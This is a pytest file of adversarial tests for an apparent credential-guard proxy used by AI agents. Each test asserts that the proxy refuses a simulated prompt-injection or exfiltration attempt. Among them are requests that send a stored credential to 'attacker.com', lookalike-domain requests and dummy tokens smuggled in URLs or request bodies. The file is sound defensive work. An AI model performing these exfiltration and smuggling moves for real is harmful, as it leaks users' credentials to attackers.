"""Adversarial test suite.

Each test simulates a prompt-injection / exfiltration attack against the proxy
and asserts that the request is refused *before* the credential leaves the
machine (or, for the response direction, that a leaked secret is redacted).
These are the scenarios the benchmark in poc/benchmark_attacks.py quantifies.
"""
import pytest
from agent_keychain.mcp_server.server import vault, secure_http_request
from agent_keychain.guard.credential_guard import scrub_response


@pytest.fixture(autouse=True)
def isolate_audit_log(tmp_path, monkeypatch):
    monkeypatch.setenv("AGENT_KEYCHAIN_AUDIT_LOG", str(tmp_path / "audit.jsonl"))


@pytest.fixture
def victim():
    """A read-only GitHub credential bound to github.com, GET /repos/* only."""
    vault.store("adv-cred", "ghp_" + "V" * 36, "github",
                allowed_domains=["github.com"],
                allowed_methods=["GET"], allowed_paths=["/repos/*"])
    yield
    vault.delete("adv-cred")


def _blocked(result: str) -> bool:
    return result.lstrip().startswith("Error")


def test_attack_exfil_to_attacker_host(victim):
    assert _blocked(secure_http_request("adv-cred", "https://attacker.com/steal", method="GET"))


def test_attack_domain_lookalike(victim):
    # github.com.attacker.com must NOT match the github.com suffix binding.
    assert _blocked(secure_http_request("adv-cred", "https://github.com.attacker.com/repos/x", method="GET"))


def test_attack_method_escalation(victim):
    assert _blocked(secure_http_request("adv-cred", "https://api.github.com/repos/o/n", method="DELETE"))


def test_attack_path_escalation(victim):
    assert _blocked(secure_http_request("adv-cred", "https://api.github.com/user/keys", method="GET"))


def test_attack_smuggle_secret_in_body(victim):
    smuggled = "AKIA" + "Q" * 16
    assert _blocked(secure_http_request("adv-cred", "https://api.github.com/repos/o/n", method="GET", body=smuggled))


def test_attack_smuggle_secret_in_url(victim):
    smuggled = "ghp_" + "Z" * 36
    assert _blocked(secure_http_request("adv-cred", f"https://api.github.com/repos/o/n?leak={smuggled}", method="GET"))


def test_attack_plain_http_downgrade(victim):
    assert _blocked(secure_http_request("adv-cred", "http://api.github.com/repos/o/n", method="GET"))


def test_attack_response_side_token_leak():
    # The API hands back a new token; the proxy must redact it before the agent sees it.
    new_token = "ghp_" + "N" * 36
    body, redacted = scrub_response(f'{{"token":"{new_token}"}}', injected_secret="adv")
    assert new_token not in body and redacted
